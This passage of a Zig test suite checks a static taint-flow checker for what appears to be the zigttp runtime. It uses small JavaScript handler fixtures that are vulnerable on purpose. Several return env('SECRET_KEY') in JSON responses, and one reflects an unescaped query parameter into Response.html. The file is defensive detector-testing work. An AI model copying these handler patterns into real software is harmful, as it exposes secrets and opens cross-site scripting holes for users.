    // proven-property surface (callers like proof_trace and
    // pi_repair_plan all use `orelse continue`).
    inline for (@typeInfo(DiagnosticKind).@"enum".fields) |field| {
        const kind: DiagnosticKind = @enumFromInt(field.value);
        const tag = propertyTagForKind(kind);
        std.testing.expect(tag != null) catch |err| {
            std.log.err(
                "DiagnosticKind.{s} has no PropertyTag mapping; add an arm to propertyTagForKind",
                .{field.name},
            );
            return err;
        };
    }
}

test "secret_in_response diagnostic carries repair_intent = insert_guard_before_line" {
    // Flow-checker diagnostics must populate the typed repair primitive so
    // the agent picks an apply step directly.
    // ZTS400 is representative of every ZTS4xx flow leak: the canonical
    // repair is `insert_guard_before_line`, where the agent inserts a
    // redact/mask/strip call ahead of the offending sink.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.json({ leaked: secret });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var saw_secret_leak: bool = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) {
            saw_secret_leak = true;
            try std.testing.expectEqual(
                @as(?RepairIntent, .insert_guard_before_line),
                d.repair_intent,
            );
        }
    }
    try std.testing.expect(saw_secret_leak);
}

test "FlowChecker flags secret returned through a variable-held response" {
    // The sink check must resolve `return res` back to the Response call that
    // produced it; a binding hop must not skip the response-sink analysis.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const res = Response.json({ leaked: secret });
        \\  return res;
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags unvalidated input in a variable-held Response.html" {
    const allocator = std.testing.allocator;
    const source =
        \\function handler(req) {
        \\  const page = Response.html(req.query.q);
        \\  return page;
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .unvalidated_input_in_egress) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().injection_safe);
}

test "FlowChecker flags secret returned through a ternary response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return req.query.debug ? Response.json({ leaked: secret }) : Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "FlowChecker keeps taint through a user-defined wrapper call" {
    // A helper that returns its argument must not strip labels; dropping them
    // here launders any taint through a one-line wrapper.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function wrap(v) { return v; }
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.json({ leaked: wrap(secret) });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker keeps validated label through a wrapper returning a validator result" {
    // The callee summary must carry the callee's actual return labels: a
    // wrapper around escapeHtml yields .validated, not the argument union,
    // so no false XSS warning fires.
    const allocator = std.testing.allocator;
    const source =
        \\import { escapeHtml } from "zigttp:text";
        \\function clean(v) { return escapeHtml(v); }
        \\function handler(req) {
        \\  return Response.html(clean(req.query.q));
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    for (checker.getDiagnostics()) |d| {
        try std.testing.expect(d.kind != .unvalidated_input_in_egress);
    }
    try std.testing.expect(checker.getProperties().injection_safe);
}
